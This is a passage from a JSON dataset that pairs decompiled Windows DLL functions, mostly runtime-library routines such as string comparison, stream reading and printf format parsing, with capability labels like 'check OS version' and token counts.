            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.1800a7c04(int64_t arg1, int32_t *arg2)\n\n{\n    int64_t **ppiVar1;\n    uint64_t *puVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    uchar auVar5 [16];\n    bool bVar6;\n    ulong arg1_00;\n    int64_t arg1_01;\n    int64_t *piVar7;\n    int32_t iVar8;\n    int64_t **ppiVar9;\n    int32_t iVar10;\n    int64_t *piVar11;\n    int32_t iVar12;\n    uchar auStack72 [8];\n    uint uStack64;\n    ulong uStack56;\n    \n    ppiVar9 = *(arg1 + 0x58);\n    iVar10 = 0;\n    bVar6 = false;\n    do {\n        iVar12 = iVar10;\n        if (-2 < *(ppiVar9 + 2)) {\n            piVar7 = *ppiVar9;\n            iVar8 = 0;\n            piVar11 = piVar7;\n            if (0 < *(arg1 + 0x50)) {\n                do {\n                    if (*piVar11 == 0) {\n                        iVar12 = iVar8 + iVar10;\n                        *arg2 = iVar12;\n                        iVar3 = *(arg1 + 0x70);\n                        LOCK();\n                        puVar2 = piVar7 + iVar8;\n                        uVar4 = *puVar2;\n                        *puVar2 = *puVar2 ^ (uVar4 == 0) * (*puVar2 ^ arg2);\n                        if (uVar4 == 0) {\n                            bVar6 = true;\n                            if (iVar3 <= iVar12) {\n                                LOCK();\n                                *(arg1 + 0x70) = *(arg1 + 0x70) + 1;\n                            }\n                            LOCK();\n                            if (iVar8 == *(ppiVar9 + 2)) {\n                                *(ppiVar9 + 2) = -1;\n                            }\n                            break;\n                        }\n                    }\n                    iVar8 = iVar8 + 1;\n                    piVar11 = piVar11 + 1;\n                    iVar12 = iVar10;\n                } while (iVar8 < *(arg1 + 0x50));\n            }\n        }\n        iVar10 = iVar12;\n        if (!bVar6) {\n            LOCK();\n            if (*(ppiVar9 + 2) == -1) {\n                *(ppiVar9 + 2) = -2;\n            }\n            iVar10 = iVar12 + *(arg1 + 0x50);\n            if (ppiVar9[1] == NULL) {\n                LOCK();\n                ppiVar1 = ppiVar9 + 1;\n                piVar7 = *ppiVar1;\n                *ppiVar1 = *ppiVar1 ^ (piVar7 == NULL) * (*ppiVar1 ^ 1);\n                if (piVar7 == NULL) {\n                    auVar5 = ZEXT816(8) * ZEXT816(*(arg1 + 0x50));\n                    arg1_00 = SUB168(auVar5, 0);\n                    if (SUB168(auVar5 >> 0x40, 0) != 0) {\n                        arg1_00 = 0xffffffffffffffff;\n                    }\n                    arg1_01 = fcn.18008ff14(arg1_00);\n                    fcn.1800ae290(arg1_01, 0, *(arg1 + 0x50) << 3);\n                    piVar7 = fcn.18008fb2c(0x18);\n                    if (piVar7 == NULL) {\n                        piVar7 = NULL;\n                    }\n                    else {\n                        piVar7[1] = 0;\n                        *piVar7 = arg1_01;\n                        *(piVar7 + 2) = 0xffffffff;\n                    }\n                    if (*(arg1 + 0x6c) < *(arg1 + 0x68)) {\n                        *(*(arg1 + 0x60) + *(arg1 + 0x6c) * 8) = piVar7;\n                        *(arg1 + 0x6c) = *(arg1 + 0x6c) + 1;\n                    }\n                    ppiVar9[1] = piVar7;\n                }\n            }\n            if (ppiVar9[1] == 0x1) {\n                uStack64 = 0;\n                uStack56 = 0x1800923e0;\n                do {\n                    fcn.180091334(auStack72);\n                } while (ppiVar9[1] == 0x1);\n            }\n        }\n        ppiVar9 = ppiVar9[1];\n        if (bVar6) {\n            return iVar10;\n        }\n    } while( true );\n}\n",
        "token_count": 1046
    },
    "1800afae": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1800afae8(int32_t *arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t in_stack_00000028;\n    uint32_t in_stack_00000030;\n    uchar auStack152 [8];\n    ulong uStack144;\n    uint uStack136;\n    uint uStack132;\n    uint32_t uStack128;\n    uint uStack124;\n    int32_t iStack120;\n    int32_t iStack116;\n    int32_t iStack112;\n    int32_t iStack108;\n    int32_t iStack104;\n    uint uStack96;\n    uint uStack92;\n    uint32_t uStack88;\n    uint uStack84;\n    uint32_t uStack72;\n    \n    if (*arg1 != -0x7ffffffd) {\n        iVar5 = fcn.1800aefd4();\n        if (*(iVar5 + 0x10) != 0) {\n            iVar5 = (**0x1800de3d8)(0);\n            iVar6 = fcn.1800aefd4();\n            if ((((*(iVar6 + 0x10) != iVar5) && (*arg1 != -0x1fbcb0b3)) && (*arg1 != -0x1fbcbcae)) &&\n               (iVar4 = fcn.1800ad514(arg1, arg2, arg3, arg4),  iVar4 != 0)) {\n                return;\n            }\n        }\n        uStack144 = *(arg4 + 8);\n        if (*(in_stack_00000028 + 0xc) == 0) {\n            fcn.1800b1ebc();\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        fcn.1800ad718(&uStack96, auStack152, in_stack_00000030, arg4);\n        uStack136 = uStack96;\n        uStack132 = uStack92;\n        uStack128 = uStack88;\n        uStack124 = uStack84;\n        if (uStack88 < uStack72) {\n            do {\n                iVar6 = *(CONCAT44(uStack92, uStack96) + 8);\n                iVar5 = *(*CONCAT44(uStack132, uStack136) + 0x10) + uStack88 * 0x14;\n                piVar1 = iVar5 + iVar6;\n                iStack120 = *piVar1;\n                iStack116 = piVar1[1];\n                iStack112 = piVar1[2];\n                iStack108 = piVar1[3];\n                iStack104 = *(iVar5 + 0x10 + iVar6);\n                if ((iStack120 <= in_stack_00000030) && (in_stack_00000030 <= iStack116)) {\n                    puVar2 = iStack104 + *(arg4 + 8) + ((*(piVar1 + 2) >> 0x20) - 1) * 0x14;\n                    if (*(puVar2 + 4) == 0) {\n                        iVar5 = 0;\n                        iVar4 = 0;\n                    }\n                    else {\n                        iVar4 = *(puVar2 + 4);\n                        iVar5 = fcn.1800ada0c();\n                        iVar5 = iVar5 + iVar4;\n                    }\n                    if (iVar5 != 0) {\n                        if (iVar4 == 0) {\n                            iVar5 = 0;\n                        }\n                        else {\n                            iVar5 = fcn.1800ada0c();\n                            iVar5 = iVar5 + *(puVar2 + 4);\n                        }\n                        if (*(iVar5 + 0x10) != '\\0') goto code_r0x0001800afcce;\n                    }\n                    if ((*puVar2 & 0x40) == 0) {\n                        fcn.1800af538(arg1, arg2, arg3, arg4);\n                    }\n                }\ncode_r0x0001800afcce:\n                uStack88 = uStack88 + 1;\n            } while (uStack88 < uStack72);\n        }\n    }\n    return;\n}\n",
        "token_count": 949
    },
    "1800b0ea": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.1800b0ea0(char param_1)\n\n{\n    char acStackX8 [8];\n    ulong var_18h_2;\n    ulong var_20h;\n    ulong var_28h;\n    ulong var_20h_2;\n    ulong *var_18h;\n    char *var_10h;\n    ulong *var_bp_8h;\n    \n    var_28h._0_4_ = 0;\n    var_18h = &var_28h;\n    var_20h._0_4_ = 0;\n    var_10h = acStackX8;\n    var_bp_8h = &var_20h;\n    var_20h_2._0_4_ = 8;\n    var_20h_2._4_4_ = 8;\n    acStackX8[0] = param_1;\n    fcn.1800b0d80(&var_18h_2, &var_20h_2 + 4, &var_18h, &var_20h_2);\n    if (acStackX8[0] != '\\0') {\n        var_20h._0_4_ = var_28h;\n    }\n    return var_20h;\n}\n",
        "token_count": 287
    },
    "1800b191": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuchar * fcn.1800b1914(void)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uchar *puVar8;\n    int64_t iVar9;\n    int64_t iStack56;\n    int64_t iStack48;\n    char cStack32;\n    int64_t iVar7;\n    \n    fcn.1800b1864(&iStack56, 0);\n    iVar9 = 0;\n    uVar5 = 0;\n    iVar1 = *(iStack48 + 0x120);\n    do {\n        iVar6 = -1;\n        do {\n            iVar7 = iVar6;\n            iVar6 = iVar7 + 1;\n        } while (*(*(iVar1 + 0x38 + uVar5 * 8) + iVar6) != '\\0');\n        iVar6 = -1;\n        do {\n            iVar6 = iVar6 + 1;\n        } while (*(*(iVar1 + uVar5 * 8) + iVar6) != '\\0');\n        uVar5 = uVar5 + 1;\n        iVar9 = iVar7 + 3 + iVar6 + iVar9;\n    } while (uVar5 < 7);\n    puVar4 = fcn.1800c3b20(iVar9 + 1);\n    if (puVar4 != NULL) {\n        uVar5 = 0;\n        puVar8 = puVar4;\n        do {\n            *puVar8 = 0x3a;\n            puVar8 = puVar8 + 1;\n            iVar3 = fcn.1800c1fe8(puVar8, puVar4 + iVar9 + (1 - puVar8), *(iVar1 + uVar5 * 8));\n            if (iVar3 != 0) {\ncode_r0x0001800b1a49:\n                fcn.1800b3558(0, 0, 0, 0, 0);\n                pcVar2 = swi(3);\n                puVar4 = (*pcVar2)();\n                return puVar4;\n            }\n            iVar6 = -1;\n            do {\n                iVar6 = iVar6 + 1;\n            } while (puVar8[iVar6] != '\\0');\n            puVar8[iVar6] = 0x3a;\n            puVar8 = puVar8 + iVar6 + 1;\n            iVar3 = fcn.1800c1fe8(puVar8, puVar4 + iVar9 + (1 - puVar8), *(iVar1 + 0x38 + uVar5 * 8));\n            if (iVar3 != 0) goto code_r0x0001800b1a49;\n            iVar6 = -1;\n            do {\n                iVar6 = iVar6 + 1;\n            } while (puVar8[iVar6] != '\\0');\n            puVar8 = puVar8 + iVar6;\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < 7);\n        *puVar8 = 0;\n    }\n    fcn.1800c34d4(0);\n    if (cStack32 != '\\0') {\n        *(iStack56 + 0x3a8) = *(iStack56 + 0x3a8) & 0xfffffffd;\n    }\n    return puVar4;\n}\n",
        "token_count": 757
    },
    "1800b1a6": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuchar * fcn.1800b1a60(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t *piVar7;\n    uchar *puVar8;\n    uint64_t uVar9;\n    ulong *puVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    int64_t iStack56;\n    int64_t iStack48;\n    char cStack32;\n    int64_t iVar6;\n    \n    fcn.1800b1864(&iStack56, 0);\n    iVar12 = 0;\n    iVar4 = *(iStack48 + 0x120);\n    iVar11 = 0xc;\n    piVar7 = iVar4 + 0x70;\n    do {\n        iVar5 = -1;\n        do {\n            iVar6 = iVar5;\n            iVar5 = iVar6 + 1;\n        } while (*(piVar7[0xc] + iVar5) != '\\0');\n        iVar5 = -1;\n        do {\n            iVar5 = iVar5 + 1;\n        } while (*(*piVar7 + iVar5) != '\\0');\n        piVar7 = piVar7 + 1;\n        iVar12 = iVar6 + 3 + iVar5 + iVar12;\n        iVar11 = iVar11 + -1;\n    } while (iVar11 != 0);\n    puVar3 = fcn.1800c3b20(iVar12 + 1);\n    if (puVar3 != NULL) {\n        uVar9 = 0;\n        puVar10 = iVar4 + 0xd0;\n        puVar8 = puVar3;\n        do {\n            *puVar8 = 0x3a;\n            puVar8 = puVar8 + 1;\n            iVar2 = fcn.1800c1fe8(puVar8, puVar3 + iVar12 + (1 - puVar8), puVar10[-0xc]);\n            if (iVar2 != 0) {\ncode_r0x0001800b1ba8:\n                fcn.1800b3558(0, 0, 0, 0, 0);\n                pcVar1 = swi(3);\n                puVar3 = (*pcVar1)();\n                return puVar3;\n            }\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (puVar8[iVar4] != '\\0');\n            puVar8[iVar4] = 0x3a;\n            puVar8 = puVar8 + iVar4 + 1;\n            iVar2 = fcn.1800c1fe8(puVar8, puVar3 + iVar12 + (1 - puVar8), *puVar10);\n            if (iVar2 != 0) goto code_r0x0001800b1ba8;\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (puVar8[iVar4] != '\\0');\n            puVar8 = puVar8 + iVar4;\n            uVar9 = uVar9 + 1;\n            puVar10 = puVar10 + 1;\n        } while (uVar9 < 0xc);\n        *puVar8 = 0;\n    }\n    fcn.1800c34d4(0);\n    if (cStack32 != '\\0') {\n        *(iStack56 + 0x3a8) = *(iStack56 + 0x3a8) & 0xfffffffd;\n    }\n    return puVar3;\n}\n",
        "token_count": 798
    },
    "1800c5d9": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.1800c5d98(uint8_t **arg1)\n\n{\n    uint8_t uVar1;\n    uint8_t *arg2;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int64_t iVar5;\n    \n    if (arg1 == NULL) {\n        puVar4 = fcn.1800ba53c(0);\n        *puVar4 = 0x16;\n        fcn.1800b3508();\n    }\n    else if (((*(arg1 + 0x14) >> 0xd & 1) != 0) && ((*(arg1 + 0x14) >> 0xc & 1) == 0)) {\n        if ((*(arg1 + 0x14) >> 1 & 1) == 0) {\n            LOCK();\n            *(arg1 + 0x14) = *(arg1 + 0x14) | 1;\n            if ((*(arg1 + 0x14) & 0x4c0) == 0) {\n                fcn.1800c3a3c(arg1);\n            }\n            arg2 = arg1[1];\n            *arg1 = arg2;\n            uVar2 = fcn.1800c20cc(arg1);\n            iVar3 = fcn.1800c87fc(uVar2, arg2, *(arg1 + 4));\n            *(arg1 + 2) = iVar3;\n            if (1 < iVar3 + 1U) {\n                if ((*(arg1 + 0x14) & 6) == 0) {\n                    iVar3 = fcn.1800c20cc(arg1);\n                    if ((iVar3 == -1) || (iVar3 = fcn.1800c20cc(arg1),  iVar3 == -2)) {\n                        iVar5 = 0x1801233c0;\n                    }\n                    else {\n                        iVar3 = fcn.1800c20cc(arg1);\n                        uVar2 = fcn.1800c20cc(arg1);\n                        iVar5 = *((iVar3 >> 6) * 8 + 0x180129850) + (uVar2 & 0x3f) * 0x48;\n                    }\n                    if ((*(iVar5 + 0x38) & 0x82) == 0x82) {\n                        LOCK();\n                        *(arg1 + 0x14) = *(arg1 + 0x14) | 0x20;\n                    }\n                }\n                if (((*(arg1 + 4) == 0x200) && ((*(arg1 + 0x14) >> 6 & 1) != 0)) && ((*(arg1 + 0x14) >> 8 & 1) == 0)) {\n                    *(arg1 + 4) = 0x1000;\n                }\n                *(arg1 + 2) = *(arg1 + 2) + -1;\n                uVar1 = **arg1;\n                *arg1 = *arg1 + 1;\n                return uVar1;\n            }\n            LOCK();\n            *(arg1 + 0x14) = *(arg1 + 0x14) | (-(iVar3 != 0) & 8) + 8;\n            *(arg1 + 2) = 0;\n        }\n        else {\n            LOCK();\n            *(arg1 + 0x14) = *(arg1 + 0x14) | 0x10;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 782
    },
    "1800b35e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.1800b35e4(uint8_t *arg1, uint8_t *arg2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int64_t iStack40;\n    int64_t iStack32;\n    char cStack16;\n    \n    if (*0x180129c54 == 0) {\n        if ((arg1 != NULL) && (arg2 != NULL)) {\n            do {\n                uVar1 = *arg1;\n                uVar2 = *arg2;\n                uVar6 = uVar1 + 0x20;\n                if (0x19 < uVar1 - 0x41) {\n                    uVar6 = uVar1;\n                }\n                uVar5 = uVar2 + 0x20;\n                arg1 = arg1 + 1;\n                arg2 = arg2 + 1;\n                if (0x19 < uVar2 - 0x41) {\n                    uVar5 = uVar2;\n                }\n            } while ((uVar6 - uVar5 == 0) && (uVar6 != 0));\n            return uVar6 - uVar5;\n        }\n        puVar4 = fcn.1800ba53c(arg1);\n        *puVar4 = 0x16;\n        fcn.1800b3508();\n        return 0x7fffffff;\n    }\n    if ((arg1 == NULL) || (arg2 == NULL)) {\n        puVar4 = fcn.1800ba53c(arg1);\n        *puVar4 = 0x16;\n        fcn.1800b3508();\n        iVar3 = 0x7fffffff;\n    }\n    else {\n        fcn.1800b1864(&iStack40, 0);\n        do {\n            uVar1 = *arg1;\n            arg1 = arg1 + 1;\n            uVar1 = *(uVar1 + *(iStack32 + 0x110));\n            uVar2 = *arg2;\n            arg2 = arg2 + 1;\n            iVar3 = uVar1 - *(uVar2 + *(iStack32 + 0x110));\n            if (iVar3 != 0) break;\n        } while (uVar1 != 0);\n        if (cStack16 != '\\0') {\n            *(iStack40 + 0x3a8) = *(iStack40 + 0x3a8) & 0xfffffffd;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 579
    },
    "1800b495": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.1800b495c(int64_t arg1)\n\n{\n    uchar uVar1;\n    int64_t iVar2;\n    char cVar3;\n    uint *puVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    \n    iVar6 = arg1;\n    cVar3 = fcn.1800b49d0(arg1);\n    if (cVar3 == '\\0') {\n        puVar4 = fcn.1800ba53c(iVar6);\n        *puVar4 = 0x16;\n        uVar5 = fcn.1800b3508();\n        uVar5 = uVar5 & 0xffffffffffffff00;\n    }\n    else {\n        iVar6 = *(arg1 + 0x468);\n        uVar1 = *(arg1 + 0x41);\n        iVar2 = *(iVar6 + 8);\n        if (*(iVar6 + 0x10) == iVar2) {\n            if (*(iVar6 + 0x18) == '\\0') {\n                *(arg1 + 0x28) = 0xffffffff;\n            }\n            else {\n                *(arg1 + 0x28) = *(arg1 + 0x28) + 1;\n            }\n        }\n        else {\n            *(arg1 + 0x28) = *(arg1 + 0x28) + 1;\n            *(iVar6 + 0x10) = *(iVar6 + 0x10) + 1;\n            ***(arg1 + 0x468) = uVar1;\n            **(arg1 + 0x468) = **(arg1 + 0x468) + 1;\n        }\n        uVar5 = CONCAT71(iVar2 >> 8, 1);\n    }\n    return uVar5;\n}\n",
        "token_count": 397
    },
    "1800b4a7": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.1800b4a78(uint8_t *arg1)\n\n{\n    int32_t *arg4;\n    uint8_t *arg1_00;\n    uint8_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    bool bVar5;\n    uint64_t in_RAX;\n    uint *puVar6;\n    uint64_t uVar7;\n    char *pcVar8;\n    ulong uVar9;\n    ushort *arg2;\n    uchar uVar10;\n    uint32_t uVar11;\n    int64_t arg3;\n    ushort uStackX8;\n    uchar uStackX10;\n    \n    uVar1 = arg1[0x41];\n    pcVar8 = in_RAX & 0xffffffffffffff00;\n    if (uVar1 != 0x46) {\n        if (uVar1 == 0x4e) {\n            if ((*arg1 & 8) != 0) goto code_r0x0001800b4be2;\n            *(arg1 + 0x2c) = 8;\n        }\n        else if (*(arg1 + 0x3c) == 0) {\n            if (uVar1 == 0x49) {\n                pcVar4 = *(arg1 + 0x18);\n                cVar2 = *pcVar4;\n                if ((cVar2 == '3') && (pcVar4[1] == '2')) {\n                    pcVar8 = pcVar4 + 2;\n                    *(arg1 + 0x3c) = 10;\n                    *(arg1 + 0x18) = pcVar8;\n                }\n                else if ((cVar2 == '6') && (pcVar4[1] == '4')) {\n                    pcVar8 = pcVar4 + 2;\n                    *(arg1 + 0x3c) = 0xb;\n                    *(arg1 + 0x18) = pcVar8;\n                }\n                else if ((cVar2 + 0xa8U < 0x21) && (pcVar8 = cVar2 + 0xa8U,  (0x120821001U >> (pcVar8 & 0x3f) & 1) != 0)\n                        ) {\n                    *(arg1 + 0x3c) = 9;\n                }\n            }\n            else if (uVar1 == 0x4c) {\n                *(arg1 + 0x3c) = 8;\n            }\n            else if (uVar1 == 0x54) {\n                *(arg1 + 0x3c) = 0xd;\n            }\n            else {\n                if (uVar1 == 0x68) {\n                    if (**(arg1 + 0x18) == 'h') {\n                        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                        pcVar8 = 0x1;\n                    }\n                    else {\n                        pcVar8 = 0x2;\n                    }\n                }\n                else {\n                    if (uVar1 == 0x6a) {\n                        *(arg1 + 0x3c) = 5;\n                        goto code_r0x0001800b4be2;\n                    }\n                    if (uVar1 != 0x6c) {\n                        if (uVar1 == 0x74) {\n                            *(arg1 + 0x3c) = 7;\n                        }\n                        else if (uVar1 == 0x77) {\n                            *(arg1 + 0x3c) = 0xc;\n                        }\n                        else if (uVar1 == 0x7a) {\n                            *(arg1 + 0x3c) = 6;\n                        }\n                        goto code_r0x0001800b4be2;\n                    }\n                    if (**(arg1 + 0x18) == 'l') {\n                        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                        pcVar8 = 0x4;\n                    }\n                    else {\n                        pcVar8 = 0x3;\n                    }\n                }\n                *(arg1 + 0x3c) = pcVar8;\n            }\ncode_r0x0001800b4be2:\n            return CONCAT71(pcVar8 >> 8, 1);\n        }\n        puVar6 = fcn.1800ba53c(arg1);\n        *puVar6 = 0x16;\n        uVar7 = fcn.1800b3508();\n        return uVar7 & 0xffffffffffffff00;\n    }\n    if ((*arg1 & 8) != 0) goto code_r0x0001800b4be2;\n    *(arg1 + 0x2c) = 7;\n    uVar1 = arg1[0x41];\n    uVar10 = 0x78;\n    if (uVar1 < 'e') {\n        if (uVar1 == 100) {\ncode_r0x0001800b4e77:\n            *(arg1 + 0x30) = *(arg1 + 0x30) | 0x10;\ncode_r0x0001800b4e7b:\n            uVar9 = 10;\ncode_r0x0001800b4e83:\n            pcVar8 = fcn.1800b5960(arg1, uVar9);\n        }\n        else {\n            if (uVar1 == 0x41) goto code_r0x0001800b4e8a;\n            if (uVar1 == 0x43) {\ncode_r0x0001800b4df5:\n                pcVar8 = fcn.1800b57fc(arg1);\n            }\n            else {\n                if (uVar1 < 'E') goto code_r0x0001800b4e93;\n                if (uVar1 < 'H') goto code_r0x0001800b4e8a;\n                if (uVar1 == 0x53) {\ncode_r0x0001800b4e33:\n                    pcVar8 = fcn.1800b5dd0(arg1);\n                }\n                else {\n                    if (uVar1 == 0x58) goto code_r0x0001800b4e48;\n                    if (uVar1 != 0x5a) {\n                        if (uVar1 != 0x61) {\n                            if (uVar1 != 99) goto code_r0x0001800b4e93;\n                            goto code_r0x0001800b4df5;\n                        }\n                        goto code_r0x0001800b4e8a;\n                    }\n                    pcVar8 = fcn.1800b52b8(arg1);\n                }\n            }\n        }\n    }\n    else {\n        if ('g' < uVar1) {\n            if (uVar1 == 0x69) goto code_r0x0001800b4e77;\n            if (uVar1 == 0x6e) {\n                pcVar8 = fcn.1800b5cf4(arg1);\n                goto code_r0x0001800b4e8f;\n            }\n            if (uVar1 == 0x6f) {\n                if ((*(arg1 + 0x30) >> 5 & 1) != 0) {\n                    *(arg1 + 0x30) = *(arg1 + 0x30) | 0x80;\n                }\n                uVar9 = 8;\n            }\n            else if (uVar1 == 0x70) {\n                *(arg1 + 0x38) = 0x10;\n                *(arg1 + 0x3c) = 0xb;\ncode_r0x0001800b4e48:\n                uVar9 = 0x10;\n            }\n            else {\n                if (uVar1 == 0x73) goto code_r0x0001800b4e33;\n                if (uVar1 == 0x75) goto code_r0x0001800b4e7b;\n                if (uVar1 != 0x78) goto code_r0x0001800b4e93;\n                uVar9 = 0x10;\n            }\n            goto code_r0x0001800b4e83;\n        }\ncode_r0x0001800b4e8a:\n        pcVar8 = fcn.1800b53a8(arg1);\n    }\ncode_r0x0001800b4e8f:\n    if (pcVar8 == '\\0') {\ncode_r0x0001800b4e93:\n        return pcVar8 & 0xffffffffffffff00;\n    }\n    if (arg1[0x40] != 0) goto code_r0x0001800b4fce;\n    uVar3 = *(arg1 + 0x30);\n    uStackX8 = 0;\n    arg3 = 0;\n    uStackX10 = 0;\n    if ((uVar3 >> 4 & 1) != 0) {\n        if ((uVar3 >> 6 & 1) == 0) {\n            if ((uVar3 & 1) == 0) {\n                if ((uVar3 >> 1 & 1) == 0) goto code_r0x0001800b4eec;\n                uStackX8 = 0x20;\n            }\n            else {\n                uStackX8 = 0x2b;\n            }\n        }\n        else {\n            uStackX8 = 0x2d;\n        }\n        arg3 = 1;\n    }\ncode_r0x0001800b4eec:\n    uVar1 = arg1[0x41];\n    if (((uVar1 + 0xa8 & 0xdf) == 0) && ((uVar3 >> 5 & 1) != 0)) {\n        bVar5 = true;\n    }\n    else {\n        bVar5 = false;\n    }\n    if ((bVar5) || ((uVar1 + 0xbf & 0xdf) == 0)) {\n        *(&uStackX8 + arg3) = 0x30;\n        if ((uVar1 == 0x58) || (uVar1 == 0x41)) {\n            uVar10 = 0x58;\n        }\n        *(&uStackX8 + arg3 + 1) = uVar10;\n        arg3 = arg3 + 2;\n    }\n    arg4 = arg1 + 0x28;\n    arg1_00 = arg1 + 0x468;\n    uVar11 = (*(arg1 + 0x34) - *(arg1 + 0x50)) - arg3;\n    if ((uVar3 & 0xc) == 0) {\n        fcn.1800b4014(arg1_00, CONCAT71(uVar3 >> 8, 0x20), uVar11, arg4);\n    }\n    arg2 = &uStackX8;\n    fcn.1800b60f4(arg1_00, arg2, arg3, arg4);\n    if (((*(arg1 + 0x30) >> 3 & 1) != 0) && ((*(arg1 + 0x30) >> 2 & 1) == 0)) {\n        fcn.1800b4014(arg1_00, CONCAT71(arg2 >> 8, 0x30), uVar11, arg4);\n    }\n    uVar9 = 0;\n    pcVar8 = fcn.1800b5f30(arg1);\n    if ((-1 < *arg4) && ((*(arg1 + 0x30) >> 2 & 1) != 0)) {\n        pcVar8 = fcn.1800b4014(arg1_00, CONCAT71(uVar9 >> 8, 0x20), uVar11, arg4);\n    }\ncode_r0x0001800b4fce:\n    return pcVar8 & 0xffffffffffffff00 | 1;\n}\n",
        "token_count": 2663
    },
    "1800b4be": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.1800b4bec(uint8_t *arg1)\n\n{\n    uint8_t *arg4;\n    uint8_t *arg1_00;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    char cVar4;\n    uint16_t uVar5;\n    uint *puVar6;\n    int16_t *piVar7;\n    uint64_t uVar8;\n    ulong arg2;\n    uchar *arg2_00;\n    uint32_t uVar9;\n    ushort uVar10;\n    int64_t arg3;\n    uchar auStack104 [32];\n    uint8_t *puStack72;\n    uint uStack56;\n    ushort uStack52;\n    uint64_t uStack48;\n    \n    uVar5 = *(arg1 + 0x42);\n    piVar7 = uVar5;\n    if (uVar5 != 0x46) {\n        if (uVar5 == 0x4e) {\n            if ((*arg1 & 8) != 0) goto code_r0x0001800b4d7b;\n            *(arg1 + 0x2c) = 8;\n        }\n        else if (*(arg1 + 0x3c) == 0) {\n            if (uVar5 == 0x49) {\n                piVar7 = *(arg1 + 0x18);\n                iVar1 = *piVar7;\n                if ((iVar1 == 0x33) && (piVar7[1] == 0x32)) {\n                    piVar7 = piVar7 + 2;\n                    *(arg1 + 0x3c) = 10;\n                    *(arg1 + 0x18) = piVar7;\n                }\n                else if ((iVar1 == 0x36) && (piVar7[1] == 0x34)) {\n                    piVar7 = piVar7 + 2;\n                    *(arg1 + 0x3c) = 0xb;\n                    *(arg1 + 0x18) = piVar7;\n                }\n                else {\n                    uVar5 = iVar1 - 0x58;\n                    piVar7 = uVar5;\n                    if ((uVar5 < 0x21) && (piVar7 = uVar5,  (0x120821001U >> (piVar7 & 0x3f) & 1) != 0)) {\n                        *(arg1 + 0x3c) = 9;\n                    }\n                }\n            }\n            else if (uVar5 == 0x4c) {\n                *(arg1 + 0x3c) = 8;\n            }\n            else if (uVar5 == 0x54) {\n                *(arg1 + 0x3c) = 0xd;\n            }\n            else {\n                if (uVar5 == 0x68) {\n                    if 